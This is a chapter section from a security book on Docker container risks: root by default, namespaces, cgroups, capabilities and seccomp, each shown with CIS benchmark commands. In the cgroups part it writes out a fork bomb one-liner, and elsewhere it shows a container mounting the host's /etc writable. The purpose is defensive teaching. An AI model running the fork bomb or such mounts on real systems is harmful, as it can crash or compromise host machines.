<p>Docker security is similar to VPS security, except there is a much larger attack surface, due to running many containers with many different packages, many of which do not receive timely security updates, as noted by <a href="https://www.banyanops.com/blog/analyzing-docker-hub/">banyan</a> and <a href="https://blog.acolyer.org/2017/04/03/a-study-of-security-vulnerabilities-on-docker-hub/">the morning paper</a>.</p>

<p>A monolithic kernel such as the Linux kernel, containing tens of millions of lines of code, which are reachable from untrusted applications via all sorts of networking, USB, driver APIs Has a huge attack surface. Adding Docker into the mix has the potential to expose all these vulnerabilities to each and every running container, and its applications within, thus making the attack surface of the kernel grow exponentially.</p>

<p>Docker leverages many features that have been in the Linux kernel for years, which provide a lot of security enhancements out of the box. The Docker Security Team are working hard to add additional tooling and techniques to further harden their components, this has become obvious as I have investigated many of them. You still need to know what all the features, tooling and techniques are, and how to use them, in order to determine whether your container security is adequate for your needs.</p>

<p>From the <a href="https://docs.docker.com/engine/understanding-docker/">Docker overview</a>, it says: <em>Docker provides the ability to package and run an application in a loosely isolated environment</em>. Later in the same document it says: <em>Each container is an isolated and secure application platform, but can be given access to resources running in a different host or container</em> leaving the loosely out. Then it goes on to say: <em>Encapsulate your applications (and supporting components) into Docker containers</em>. The meaning of encapsulate is to enclose, but If we are only loosely isolating, then were not really enclosing are we? I will address this concern in the following Docker sections and subsections.</p>

<p>To start with, I am going to discuss many areas where we can improve container security, then at the end of this Docker section I will discuss why application security is far more of a concern than container security.</p>

<h5 id="leanpub-auto-consumption-from-registrieshttpsdocsdockercomregistry">Consumption from <a href="https://docs.docker.com/registry/">Registries</a>
</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----average-verywidespread-easy-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Similar to <a href="chap06.html#web-applications-identify-risks-consuming-free-and-open-source">Consuming Free and Open Source</a> from the Web Applications chapter, many of us trust the images on docker hub without much consideration to the possible defective packages within. There have been quite a few reports with varying numbers of vulnerable images as noted by Banyan and the morning paper mentioned above.</p>

<p>The Docker Registry <a href="https://github.com/docker/distribution">project</a> is an open-source server side application that lets you store and distribute Docker images. You could run your own registry as part of your organisations Continuous Integration (CI) / Continuous Delivery (CD) pipeline. Some of the public known instances of the registry are:</p>

<ul>
  <li><a href="https://hub.docker.com/explore/">Docker Hub</a></li>
  <li>EC2 Container Registry</li>
  <li>Google Container Registry</li>
  <li>CoreOS quay.io</li>
</ul>

<h5 id="leanpub-auto-doppelganger-images">Doppelganger images</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----average-common-average-severe.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Beware of doppelganger images that will be available for all to consume, similar to <a href="chap06.html#web-applications-countermeasures-consuming-free-and-open-source-keeping-safe-doppelganger-packages">doppelganger packages</a> that we discuss in the Web Applications chapter. These can contain a huge number of packages and code to hide malware in a Docker image.</p>

<h5 id="vps-identify-risks-docker-the-default-user-is-root">The Default User is Root</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----easy-common-veryeasy-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>What is worse, dockers default is to run containers, and all commands / processes within a container as root. This can be seen by running the following command from the <a href="https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf">CIS_Docker_1.13.0_Benchmark</a>:</p>

<figure class="code">
  <figcaption>Query User running containers</figcaption>

<div class="highlight"><pre><code></code>docker ps --quiet <code class="p">|</code> xargs docker inspect --format <code class="s1">'{{ .Id }}: User={{ .Config.User }}'</code>
</pre></div>

</figure>

<p>If you have two containers running and the user has not been specified you will see something like the below, which means your two containers are running as root.</p>

<figure class="code">
  <figcaption>Result of user running containers output</figcaption>

<div class="highlight"><pre><code></code>&lt;container n Id&gt;: <code class="nv">User</code><code class="o">=</code>
&lt;container n+1 Id&gt;: <code class="nv">User</code><code class="o">=</code>
</pre></div>

</figure>

<p>Images derived from other images inherit the same user defined in the parent image explicitly or implicitly, so unless the image creator has specifically defined a non root user, the user will default to root. That means, all processes within the container will run as root.</p>

<h5 id="leanpub-auto-docker-host-engine-and-containers">Docker Host, Engine and Containers</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----difficult-uncommon-average-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Considering these processes run as root, and have <a href="https://theinvisiblethings.blogspot.co.nz/2012/09/how-is-qubes-os-different-from.html">indirect access</a> to most of the Linux Kernel (20+ million lines of code written by humans) APIs such as networking, USB, storage stacks, and others via System calls, the situation may look bleak.</p>


<figure class="image center" style="width: 396px;">
  <img src="images/HypervisorVsContainers.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p><a href="http://man7.org/linux/man-pages/man2/syscalls.2.html">System calls</a> are how programmes access the kernel to perform tasks. This attack surface is huge, and all before any security is added on top in the form of LXC, or libcontainer (now <a href="https://github.com/opencontainers/runc">opencontainers/runc</a>), or <a href="chap03.html#vps-identify-risks-docker-docker-host-engine-and-containers-linux-security-modules">Linux Security Modules (LSM)</a> such as AppArmor or SELinux, which are often seen as an annoyance and just disabled like many other forms of security.</p>

<p>If you run a container, you may have to install <code>kmod</code>, then run <code>lsmod</code> in the container and also on the host system, you will see that the same modules are loaded, this is because as mentioned, the container shares the host kernel, so there is not a lot between processes within the container and the host kernel, and considering as mentioned above, the processes within the container may be running as root also, it will pay for you to get a good understanding of the security features Docker provides and how to employ them.</p>

<p>The <a href="chap03.html#vps-identify-risks-docker-docker-engine-and-containers-seccomp">Seccomp section below</a> discusses Dockers attempt to put a stop to some System calls accessing the kernel APIs. There are also many other features that Docker has added or leveraged in terms of mitigating a lot of this potential abuse. So although the situation initially looks bad, Docker has done a lot to improve it.</p>

<p>As you can see in the above image, the host kernel is open to receiving potential abuse from containers. Make sure you keep it patched. We will now walk though many areas of potential abuse. The <a href="chap03.html#vps-countermeasures-docker">countermeasures</a> sections offer information, advice, and techniques for further improving Docker security.</p>

<h6 id="vps-identify-risks-docker-docker-host-engine-and-containers-namespaces">Namespaces</h6>

<p>The first place to read for solid background on Linux kernel namespaces is the <a href="http://man7.org/linux/man-pages/man7/namespaces.7.html">man-page</a>, otherwise I would just have to repeat what is there. A lot of what is to follow around namespaces requires some knowledge from the namespaces man-page, so do your self a favour and read it first.</p>

<p>Linux kernel namespaces started to be added between 2.6.15 (January 2006) and 2.6.26 (July 2008)</p>

<p>According to the namespaces man page, IPC, network and UTS namespace support was available from kernel version 3.0, mount, PID and user namespace support was available from kernel version 3.8 (February 2013), cgroup namespace support was available from kernel version 4.6 (May 2016).</p>

<p>Each aspect of a container runs in a separate namespace and its access is limited to that namespace.</p>

<p>Docker leverages the Linux (kernel) namespaces which provide an isolated workspace which wraps a global system resource abstraction that makes it appear to the processes within the namespace that they have their own isolated instance of the global resource. When a container is run, Docker creates a set of namespaces for that container, providing a layer of isolation between containers:</p>

<ol class="numeric">
  <li>
<code>mnt</code>: (Mount) Provides filesystem isolation by managing filesystems and mount points. The <code>mnt</code> namespace allows a container to have its own isolated set of mounted filesystems, the propagation modes can be one of the following: [<code>r</code>]<code>shared</code>, [<code>r</code>]<code>slave</code> or [<code>r</code>]<code>private</code>. The <code>r</code> means recursive.
    <p>If you run the following command, then the hosts mounted <code>host-path</code> is <a href="https://docs.docker.com/engine/reference/run/#volume-shared-filesystems">shared</a> with all others that mount <code>host-path</code>. Any changes made to the mounted data will be propagated to those that use the <code>shared</code> mode propagation. Using <code>slave</code> means only the master (<code>host-path</code>) is able to propagate changes, not vice-versa. Using <code>private</code> which is the default, will ensure no changes can be propagated.</p>

    <figure class="code">
      <figcaption>Mounting volumes in shared mode propagation</figcaption>

<div class="highlight"><pre><code></code> docker run &lt;run arguments&gt; --volume<code class="o">=[</code>host-path:<code class="o">]</code>&lt;container-path&gt;:<code class="o">[</code>z<code class="o">][</code>r<code class="o">]</code>shared &lt;container ima<code class="se">\</code>
ge name or id&gt; &lt;command&gt; &lt;args...&gt;
</pre></div>

    </figure>

    <p>If you omit the <code>host-path</code> you can <a href="https://docs.docker.com/engine/tutorials/dockervolumes/#locating-a-volume">see the host path</a> that was mounted by running the following command:</p>

    <figure class="code">
      <figcaption>Query</figcaption>

<div class="highlight"><pre><code></code> docker inspect &lt;name or id of container&gt;
</pre></div>

    </figure>

    <p>Find the Mounts property in the JSON produced. It will have a Source and Destination similar to:</p>

    <figure class="code">
      <figcaption>Result</figcaption>

<div class="highlight"><pre><code></code> <code class="err">...</code>
 <code class="s2">"Mounts"</code><code class="err">:</code> <code class="p">[</code>
   <code class="p">{</code>
     <code class="nt">"Name"</code><code class="p">:</code> <code class="s2">"&lt;container id&gt;"</code><code class="p">,</code>
     <code class="nt">"Source"</code><code class="p">:</code> <code class="s2">"/var/lib/docker/volumes/&lt;container id&gt;/_data"</code><code class="p">,</code>
     <code class="nt">"Destination"</code><code class="p">:</code> <code class="s2">"&lt;container-path&gt;"</code><code class="p">,</code>
     <code class="nt">"Mode"</code><code class="p">:</code> <code class="s2">""</code><code class="p">,</code>
     <code class="nt">"RW"</code><code class="p">:</code> <code class="kc">true</code><code class="p">,</code>
     <code class="nt">"Propagation"</code><code class="p">:</code> <code class="s2">"shared"</code>
   <code class="p">}</code>
 <code class="p">]</code>
 <code class="err">...</code>
</pre></div>

    </figure>

    <p>An empty string for Mode means it is set to its default of read-write. This means for example that a container can mount sensitive host system directories such as <code>/</code>, <code>/boot</code>, <code>/etc</code> (as seen in <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies">Review Password Strategies</a>), <code>/lib</code>, <code>/proc</code>, <code>/sys</code>, along with the rest discussed in the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions">Lock Down the Mounting of Partitions</a> section, if that advice was not followed, if it was you have some defence in depth working for you, and although Docker may have mounted a directory as read-write, the underlying mount may be read-only, thus stopping the container from being able to modify files in these locations on the host system. If the host does not have the above directories mounted with constrained permissions, then we are relying on the user that runs any given Docker container mounting a sensitive host volume to mount it as read-only. For example, after the following command has been run, users within the container can modify files in the hosts <code>/etc</code> directory:</p>

    <figure class="code">
      <figcaption>Vulnerable mount</figcaption>

<div class="highlight"><pre><code></code> docker run -it --rm -v /etc:/hosts-etc --name<code class="o">=</code>lets-mount-etc ubuntu
</pre></div>

    </figure>

    <figure class="code">
      <figcaption>Query</figcaption>

<div class="highlight"><pre><code></code> docker inspect -f <code class="s2">"{{ json .Mounts }}"</code> lets-mount-etc
</pre></div>

    </figure>

    <figure class="code">
      <figcaption>Result</figcaption>

<div class="highlight"><pre><code></code> <code class="o">[</code>
   <code class="o">{</code>
     <code class="s2">"Type"</code>:<code class="s2">"bind"</code>,
     <code class="s2">"Source"</code>:<code class="s2">"/etc"</code>,
     <code class="s2">"Destination"</code>:<code class="s2">"/hosts-etc"</code>,
     <code class="s2">"Mode"</code>:<code class="s2">""</code>,
     <code class="s2">"RW"</code>:true,
     <code class="s2">"Propagation"</code>:<code class="s2">""</code>
   <code class="o">}</code>
 <code class="o">]</code>
</pre></div>

    </figure>

    <p>Also keep in mind that by default the user in the container unless otherwise specified is root, and that is the same root user that is on the host system.</p>

    <p id="vps-identify-risks-docker-docker-host-engine-and-containers-namespaces-mnt-labelling">Labelling systems such as <a href="chap03.html#vps-identify-risks-docker-docker-host-engine-and-containers-linux-security-modules">Linux Security Modules (LSM)</a> require that the contents of a volume mounted into a container be <a href="https://docs.docker.com/engine/tutorials/dockervolumes/#volume-labels">labelled</a>. This can be done by adding the <code>z</code> (as seen in above example) or <code>Z</code> suffix to the volume mount. The <code>z</code> suffix instructs Docker that you intend to share the mounted volume with other containers, and in doing so, Docker applies a shared content label. Alternatively if you provide the <code>Z</code> suffix, Docker applies a private unshared label, which means only the current container can use the mounted volume. Further details can be found at the <a href="https://docs.docker.com/engine/tutorials/dockervolumes/#volume-labels">dockervolumes documentation</a>. This is something to keep in mind if you are using LSM and have a process inside your container that is unable to use the mounted data.<br />
 <code>--volumes-from</code> allows you to specify a data volume from another container.</p>

    <p>You can also <a href="https://linux.die.net/man/8/mount">mount</a> your Docker container mounts on the host by doing the following:</p>

    <figure class="code">
<div class="highlight"><pre><code></code> mount --bind /var/lib/docker/&lt;volumes&gt;/&lt;container id&gt;/_data &lt;/path/on/host&gt;  
</pre></div>

    </figure>
  </li>
  <li>
<code>PID</code>: (Process ID) Provides process isolation, separates container processes from host and other container processes.  
    <p>The first process that is created in a new <code>PID</code> namespace is the init process with <code>PID</code> 1, which assumes parenthood of the other processes within the same <code>PID</code> namespace. When <code>PID</code> 1 is terminated, so are the rest of the processes within the same <code>PID</code> namespace.</p>

    <p><code>PID</code> namespaces are <a href="https://lwn.net/Articles/531419/">hierarchically nested</a> in ancestor-descendant relationships to a depth of up to 32 levels. All <code>PID</code> namespaces have a parent namespace, other than the initial root <code>PID</code> namespace of the host system. That parent namespace is the <code>PID</code> namespace of the process that created the child namespace.</p>

    <p>Within a <code>PID</code> namespace, it is possible to access (make system calls to specific <code>PID</code>s) all other processes in the same namespace, as well as all processes of descendant namespaces, however processes in a child <code>PID</code> namespace cannot see processes that exist in the parent <code>PID</code> namespace or further removed ancestor namespaces. The direction any process can access another process in an ancestor/descendant <code>PID</code> namespace is one way.</p>

    <p>Processes in different <code>PID</code> namespaces can have the same <code>PID</code>, because the <code>PID</code> namespace isolates the <code>PID</code> number space from other <code>PID</code> namespaces.</p>

    <p>Docker takes advantage of <code>PID</code> namespaces. Just as you would expect, a Docker container can not access the host system processes, and process ids that are used in the host system can be reused in the container, including <code>PID</code> 1, by being reassigned to a process started within the container. The host system can however access all processes within its containers, because as stated above, <code>PID</code> namespaces are hierarchically nested in parent-child relationships, so processes in the hosts <code>PID</code> namespace can access all processes in their own namespace down to the <code>PID</code> namespace that was responsible for starting the process, that is the process within the container in our case.</p>

    <p>The default behaviour can however be overridden to allow a container to be able to access processes within a sibling container, or the hosts <code>PID</code> namespace. <a href="https://docs.docker.com/engine/reference/run/#pid-settings---pid">Example</a>:</p>

    <figure class="code">
      <figcaption>Syntax</figcaption>

<div class="highlight"><pre><code></code> --pid<code class="o">=[</code>container:&lt;name<code class="p">|</code>id&gt;<code class="o">]</code>,<code class="o">[</code>host<code class="o">]</code>
</pre></div>

    </figure>

    <figure class="code">
      <figcaption>Example</figcaption>

<div class="highlight"><pre><code></code> <code class="c1"># Provides access to the `PID` namespace of container called myContainer</code>
 <code class="c1"># for container created from myImage.</code>
 docker run --pid<code class="o">=</code>container:myContainer myImage
</pre></div>

    </figure>

    <figure class="code">
      <figcaption>Example</figcaption>

<div class="highlight"><pre><code></code> <code class="c1"># Provides access to the host `PID` namespace for container created from myImage</code>
 docker run --pid<code class="o">=</code>host myImage
</pre></div>

    </figure>

    <p>As an aside, <code>PID</code> namespaces give us the <a href="http://man7.org/linux/man-pages/man7/pid_namespaces.7.html">functionality of</a>: <em>suspending/resuming the set of processes in the container and migrating the container to a new host while the processes inside the container maintain the same PIDs.</em> with a <a href="https://www.fir3net.com/Containers/Docker/the-essential-guide-in-transporting-your-docker-containers.html">handful of commands</a>:</p>

    <figure class="code">
      <figcaption>Example</figcaption>

<div class="highlight"><pre><code></code> docker container pause myContainer <code class="o">[</code>mySecondContainer...<code class="o">]</code>
 docker <code class="nb">export</code> <code class="o">[</code>options<code class="o">]</code> myContainer
 <code class="c1"># Move your container to another host.</code>
 docker import <code class="o">[</code>OPTIONS<code class="o">]</code> file<code class="p">|</code>URL<code class="p">|</code>- <code class="o">[</code>REPOSITORY<code class="o">[</code>:TAG<code class="o">]]</code>
 docker container unpause myContainer <code class="o">[</code>mySecondContainer...<code class="o">]</code>
</pre></div>

    </figure>
  </li>
  <li>
<code>net</code>: (Networking) Provides network isolation by managing the network stack and interfaces. Also essential to allow containers to communicate with the host system and other containers. Network namespaces were introduced into the kernel in 2.6.24, January 2008, with an additional year of development they were considered largely done. The only real concern here is understanding the Docker network modes and communication between containers. This is discussed in the Countermeasures.  </li>
  <li>
<code>UTS</code>: (Unix Timesharing System) Provides isolation of kernel and version identifiers.  
    <p>UTS is the sharing of a computing resource with many users, a concept introduced in the 1960s/1970s.</p>

    <p>A UTS namespace is the set of identifiers <a href="http://man7.org/linux/man-pages/man2/clone.2.html">returned by <code>uname</code></a>, which include the hostname and the <a href="chap03.html#vps-identify-risks-unnecessary-and-vulnerable-services-nis">NIS</a> domainname. Any processes which are not children of the process that requested the clone will not be able to see any changes made to the identifiers of the UTS namespace.</p>

    <p>If the <code>CLONE_NEWUTS</code> constant is set, then the process being created will be created in a new UTS namespace with the hostname and NIS domain name copied and able to be modified independently from the UTS namespace of the calling process.</p>

    <p>If the <code>CLONE_NEWUTS</code> constant is not set, then the process being created will be created in the same UTS namespace of the calling process, thus able to change the identifiers returned by <code>uname</code>.</p>

    <p>When a container is created, a UTS namespace is copied (<a href="https://github.com/docker/libcontainer/blob/83a102cc68a09d890cce3b6c2e5c14c49e6373a0/SPEC.md"><code>CLONE_NEWUTS</code> is set</a>)(<code>--uts=""</code>) by default, providing a UTS namespace that can be modified independently from the target UTS namespece it was copied from.</p>

    <p>When a container is created with <a href="https://docs.docker.com/engine/reference/run/#uts-settings---uts"><code>--uts="host"</code></a>, a UTS namespace is inherited from the host, the <code>--hostname</code> flag is invalid.  </p>
  </li>
  <li>
<code>IPC</code>: (InterProcess Communication) manages access to InterProcess Communications). <code>IPC</code> namespaces isolate your containers System V IPC and POSIX message queues, semaphores, and named shared memory from those of the host and other containers, unless another container specifies on run that it wants to share your namespace. It would be a lot safer if the producer could specify which consuming containers could use its <a href="http://man7.org/linux/man-pages/man7/namespaces.7.html">namespace</a>. IPC namespaces do not include IPC mechanisms that use filesystem resources such as named pipes.
    <p>According to the <a href="http://man7.org/linux/man-pages/man7/namespaces.7.html">namespaces man page</a>: <em>Objects created in an IPC namespace are visible to all other processes that are members of that namespace, but are not visible to processes in other IPC namespaces.</em></p>

    <p>Although sharing memory segments between processes provide Inter-Process Communications at memory speed, rather than through pipes or worse, the network stack, this produces a significant security concern.</p>

    <p>By default a container does not share the hosts or any other containers IPC namespace. This behaviour can be overridden to allow a (any) container to reuse another containers or the hosts message queues, semaphores, and shared memory via their IPC namespace. <a href="https://docs.docker.com/engine/reference/run/#ipc-settings---ipc">Example</a>:</p>

    <figure class="code">
      <figcaption>Syntax</figcaption>

<div class="highlight"><pre><code></code> <code class="c1"># Allows a container to reuse another container's IPC namespace.</code>
 --ipc<code class="o">=[</code>container:&lt;name<code class="p">|</code>id&gt;<code class="o">]</code>,<code class="o">[</code>host<code class="o">]</code>
</pre></div>

    </figure>

    <figure class="code">
      <figcaption>Example</figcaption>

<div class="highlight"><pre><code></code> docker run -it --rm --name<code class="o">=</code>container-producer ubuntu
 root@609d19340303:/#
    
 <code class="c1"># Allows the container named container-consumer to share the IPC namespace</code>
 <code class="c1"># of container called container-producer.</code>
 docker run -it --rm --name<code class="o">=</code>container-consumer --ipc<code class="o">=</code>container:container-producer ubuntu
 root@d68ecd6ce69b:/#
</pre></div>

    </figure>

    <p>Now find the Ids of the two running containers:  </p>

    <figure class="code">
      <figcaption>Query</figcaption>

<div class="highlight"><pre><code></code> docker inspect --format<code class="o">=</code><code class="s2">"{{ .Id }}"</code> container-producer container-consumer
</pre></div>

    </figure>

    <figure class="code">
      <figcaption>Result</figcaption>

<div class="highlight"><pre><code></code> 609d193403032a49481099b1fc53037fb5352ae148c58c362ab0a020f473c040
 d68ecd6ce69b89253f7ab14de23c9335acaca64d210280590731ce1fcf7a7556
</pre></div>

    </figure>

    <p>Now you can see using the command supplied from the <a href="https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf">CIS_Docker_1.13.0_Benchmark</a> that <code>container-consumer</code> is using the IPC namespace of <code>container-producer</code>:</p>

    <figure class="code">
      <figcaption>Query</figcaption>

<div class="highlight"><pre><code></code> docker ps --quiet --all <code class="p">|</code> xargs docker inspect --format <code class="s1">'{{ .Id }}: IpcMode={{ .HostConfig.I\</code>
<code class="s1">pcMode }}'</code>
</pre></div>

    </figure>

    <figure class="code">
      <figcaption>Result</figcaption>

<div class="highlight"><pre><code></code> d68ecd6ce69b89253f7ab14de23c9335acaca64d210280590731ce1fcf7a7556: <code class="nv">IpcMode</code><code class="o">=</code>container:containe<code class="se">\</code>
r-producer
 609d193403032a49481099b1fc53037fb5352ae148c58c362ab0a020f473c040: <code class="nv">IpcMode</code><code class="o">=</code>
</pre></div>

    </figure>

    <p>When the last process in an IPC namespace terminates, the namespace will be destroyed along with all IPC objects in the namespace.  </p>
  </li>
  <li>
<code>user</code>: Not enabled by default. Allows a process within a container to have a unique range of user and group Ids within the container, known as the subordinate user and group Id feature in the Linux kernel, that do not map to the same user and group Ids of the host, container users to host users are remapped. So for example, if a user within a container is root, which it is by default unless a specific user is defined in the image hierarchy, it will be mapped to a non-privileged user on the host system.<br />
Docker considers user namespaces to be an advanced feature. There are currently some Docker features that are <a href="https://docs.docker.com/engine/reference/commandline/dockerd/#user-namespace-known-restrictions">incompatible</a> with using user namespaces, and according to the <a href="https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf">CIS Docker 1.13.0 Benchmark</a>, functionalities that are broken if user namespaces are used. the <a href="https://docs.docker.com/engine/reference/commandline/dockerd/#/user-namespace-known-restrictions">Docker engine reference</a> provides additional details around known restrictions of user namespaces.<br />
If your containers have a predefined non root user, then currently user namespaces should not be enabled, due to possible unpredictable issues and complexities according to 2.8 Enable user namespace support of the <a href="https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf">CIS Docker Benchmark</a>.<br />
The main problem, is that these mappings are performed on the Docker daemon rather than at a per-container level, so it is an all or nothing approach, this may change in the future though.<br />
As mentioned, user namespace support is available, but not enabled by default in the Docker daemon.</li>
</ol>

<h6 id="leanpub-auto-control-groups">Control Groups</h6>

<p>When a container is started with <code>docker run</code> without specifying a cgroup parent, as well as creating the namespaces discussed above, Docker also creates a Control Group (or cgroup) with a set of system resource hierarchies, nested under the default parent <code>docker</code> cgroup, also created at container runtime if not already present. You can see how this hierarchy looks in the <code>/sys/fs/cgroup</code> pseudo-filesystem in the <a href="chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-control-groups-sys-fs-cgroup">Countermeasures</a> section. Cgroups have been available in the Linux kernel since <a href="https://kernelnewbies.org/Linux_2_6_24#head-5b7511c1e918963d347abc8ed4b75215877d3aa3">January 2008 (2.6.24)</a>, and have continued to be improved. Cgroups track, provide the ability to monitor, and configure fine-grained limitations on how much of any resource a set of processes, or in the case of Docker or pure LXC, any given container can use, such as CPU, memory, disk I/O, and network. Many aspects of these resources can be controlled, but by default, any given container can use all of the systems resources, allowing potential DoS.</p>

<p>
  <strong>Fork Bomb from Container</strong>
</p>

<p>If an attacker gains access to a container or in a multi-tenanted scenario where being able to run a container by an arbitrary entity is expected, by default, there is nothing stopping a fork bomb<br />
<code>:(){:|:&amp;};:</code><br />
launched in a container from bringing the host system down. This is because by default there is no limit to the number of processes a container can run.</p>

<h6 id="leanpub-auto-capabilities">Capabilities</h6>

<p>According to the Linux <a href="http://man7.org/linux/man-pages/man7/capabilities.7.html">man page for capabilities</a>, <em>Linux divides the privileges traditionally associated with superuser into distinct units, known as capabilities, which can be independently enabled and disabled</em> this is on a per thread basis. So root with all capabilities has privileges to do everything. According to the man page, there are currently 38 capabilities.</p>

<p>By default, the following capabilities are available to the default user of root within a container, check the man page for the full descriptions of the capabilities. The very knowledgeable Dan Walsh who is one of the experts when it comes to applying least privilege to containers, also <a href="http://rhelblog.redhat.com/2016/10/17/secure-your-containers-with-this-one-weird-trick/">discusses these</a>: <code>chown</code>, <code>dac_override</code>, <code>fowner</code>, <code>fsetid</code>, <code>kill</code>, <code>setgid</code>, <code>setuid</code>, <code>setpcap</code>, <code>net_bind_service</code>, <code>net_raw</code>, <code>sys_chroot</code>, <code>mknod</code>, <code>audit_write</code>, <code>setfcap</code>. <code>net_bind_service</code> for example allows the superuser to bind a socket to a privileged port &lt;1024 if enabled. The Open Container Initiative (OCI) <a href="https://github.com/opencontainers/runc/tree/6c22e77604689db8725fa866f0f2ec0b3e8c3a07#running-containers">runC specification</a> is considerably more restrictive only enabling three capabilities: <code>audit_write</code>, <code>kill</code>, <code>net_bind_service</code></p>

<p>As stated on the Docker Engine <a href="https://docs.docker.com/engine/security/security/">security page</a>: <em>One primary risk with running Docker containers is that the default set of capabilities and mounts given to a container may provide incomplete isolation, either independently, or when used in combination with kernel vulnerabilities.</em></p>

<h6 id="vps-identify-risks-docker-docker-host-engine-and-containers-linux-security-modules">Linux Security Modules (LSM)</h6>

<p>A little history to start with: In the early 1990s, Linux was developed as a clone of the Unix Operating system. The core Unix security model which is a form of <a href="https://en.wikipedia.org/wiki/Discretionary_access_control">Discretionary Access Control</a> (DAC) was inherited by Linux. I have provided a glimpse of some of the Linux kernel security features that have been developed since the inception of Linux. The Unix DAC remains at the core of Linux. The Unix DAC allows a subject and/or group of an identity to set the security policy for a specific object, the canonical example being a file, and having a user set the different permissions on who can do what with it. The Unix DAC was <a href="https://www.linux.com/learn/overview-linux-kernel-security-features">designed in 1969</a>, and a lot has changed since then.</p>

<p>Capabilities may or not be to course grained, get an understanding of both capabilities and Linux Security Modules (LSMs). Many of the DACs can be circumvented by users. Finer grained control is often required along with Mandatory Access Control (MAC).</p>

<h6 id="vps-identify-risks-docker-docker-engine-and-containers-seccomp">SecComp</h6>

<p>Secure Computing Mode (SecComp) is a security facility that reduces the attack surface of the Linux kernel by reducing the number of System calls that can be made by a process. Any System calls made by the process outside of the defined set will cause the kernel to terminate the process with <code>SIGKILL</code>. By doing this, the SecComp facility stops a process from accessing the kernel APIs via System calls.</p>

<p>The first version of SecComp was merged into the Linux kernel mainline in <a href="https://git.kernel.org/cgit/linux/kernel/git/tglx/history.git/commit/?id=d949d0ec9c601f2b148bed3cdb5f87c052968554">version 2.6.12 (March 8 2005)</a>. If enabled for a given process, only four System calls could be made: <code>read()</code>, <code>write()</code>, <code>exit()</code>, and <code>sigreturn()</code>, thus significantly reducing the kernels attack surface.</p>

<p>In order to enable SecComp for a given process, <a href="https://lwn.net/Articles/656307/">you would write</a> a <code>1</code> to <code>/proc/&lt;PID&gt;/seccomp</code>. This would cause the one-way transition into the restrictive state.</p>

<p>There has been a few revisions, since 2005, like with the seccomp filter mode being added, which allowed processes to specify which System calls were allowed. Then the addition of the <code>seccomp()</code> System call in 2014 to the kernel version 3.17. <a href="https://en.wikipedia.org/wiki/Seccomp">Along with popular applications</a> such as Chrome/Chromium, OpenSSH, Docker uses SecComp to reduce the attack surface on the kernel APIs.</p>

<p>Docker has <a href="https://docs.docker.com/engine/security/seccomp/">disabled about 44 system calls</a> in its default (seccomp) container profile (<a href="https://github.com/docker/docker/blob/master/profiles/seccomp/default.json">default.json</a>) out of well over 300 available in the Linux kernel. Docker calls this <em>moderately protective while providing wide application compatibility</em>. It appears that ease of use is the first priority. Again, plenty of opportunity here for reducing the attack surface on the kernel APIs, for example the <code>keyctl</code> System call was removed from the default Docker container profile after vulnerability <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2016-0728">CVE-2016-0728</a> was discovered, which allows privilege escalation or denial of service. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-3153">CVE-2014-3153</a> is another vulnerability accessible from the <code>futex</code> System call which is white listed in the default Docker profile.</p>

<p>If you are looking to attack the Linux kernel via its APIs from a Docker container, you have still got plenty of surface area here to play with.</p>

<h6 id="leanpub-auto-read-only-containers">Read-only Containers</h6>

<p>In order to set-up read-only hosts, physical or VM, there is a lot of work to be done, and in some cases, it becomes challenging to stop an Operating System writing to some files. Remember back to how much work was involved in <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation">Partitioning on OS Installation</a> and <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions">Lock Down the Mounting of Partitions</a>. In contrast, running Docker containers as read-only is trivial. Check the <a href="chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-read-only-containers">Countermeasures</a> section.</p>

<h5 id="leanpub-auto-application-security">Application Security</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----easy-common-easy-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Application security is still our biggest weakness. I cover this in many other places, and especially in the <a href="chap06.html#web-applications">Web Applications</a> chapter.</p>

<h4 id="leanpub-auto-using-components-with-known-vulnerabilities">Using Components with Known Vulnerabilities</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----average-widespread-difficult-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>This is exactly what your attackers rely on you doing. Not upgrading out of date software. This is the same concept as discussed in the Web Applications chapter under <a href="chap06.html#web-applications-identify-risks-consuming-free-and-open-source">Consuming Free and Open Source</a>. Just do not do it. Stay patched.</p>

<h4 id="leanpub-auto-lack-of-backup">Lack of Backup</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----difficult-common-veryeasy-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>There is not a lot to say here, other than make sure you do this. I have personally seen so many disasters that could have been avoided if timely / regular backups had of been implemented and tested routinely. I have seen many situations where backup schedules were in place, but they had not been tested for a period of time, and when it came time to use them, they were not available for various reasons. When your infrastructure gets owned, dont be the one that can not roll back to a good known state.</p>

